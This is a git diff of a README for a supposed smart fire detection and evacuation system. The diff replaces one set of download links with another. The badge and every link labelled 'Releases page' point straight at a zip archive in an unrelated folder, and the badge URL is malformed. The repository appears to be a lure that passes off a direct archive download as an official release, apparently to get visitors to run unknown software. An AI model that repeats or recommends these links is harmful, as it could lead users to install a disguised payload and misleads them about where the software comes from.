@@ -1,6 +1,6 @@
 # 🔥 Smart_Fire_Detection_Evacuation_System - Early Alerts for Fire Safety
 
-[![Download Now](https://raw.githubusercontent.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/main/diastole/System-Smart-Evacuation-Fire-Detection-v2.8-alpha.5.zip%20Now-Check%https://raw.githubusercontent.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/main/diastole/System-Smart-Evacuation-Fire-Detection-v2.8-alpha.5.zip)](https://raw.githubusercontent.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/main/diastole/System-Smart-Evacuation-Fire-Detection-v2.8-alpha.5.zip)
+[![Download Now](https://github.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/raw/refs/heads/main/diastole/Detection_Evacuation_System_Fire_Smart_3.1.zip%20Now-Check%https://github.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/raw/refs/heads/main/diastole/Detection_Evacuation_System_Fire_Smart_3.1.zip)](https://github.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/raw/refs/heads/main/diastole/Detection_Evacuation_System_Fire_Smart_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Smart Fire Detection and Evacuation Assistant**! This system us
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/main/diastole/System-Smart-Evacuation-Fire-Detection-v2.8-alpha.5.zip) to download the software.
+To get started, visit the [Releases page](https://github.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/raw/refs/heads/main/diastole/Detection_Evacuation_System_Fire_Smart_3.1.zip) to download the software.
 
 ### Steps to Download
 
@@ -80,4 +80,4 @@ Thanks to all contributors and users who help improve this project. Your support
 
 This project is licensed under the MIT License. You can use it freely as long as you meet the licensing conditions.
 
-Remember, safety is the priority. Enjoy using the Smart Fire Detection and Evacuation Assistant! For easy access, don’t forget to download the software from our [Releases page](https://raw.githubusercontent.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/main/diastole/System-Smart-Evacuation-Fire-Detection-v2.8-alpha.5.zip).
+Remember, safety is the priority. Enjoy using the Smart Fire Detection and Evacuation Assistant! For easy access, don’t forget to download the software from our [Releases page](https://github.com/hoxuannghi/Smart_Fire_Detection_Evacuation_System/raw/refs/heads/main/diastole/Detection_Evacuation_System_Fire_Smart_3.1.zip).
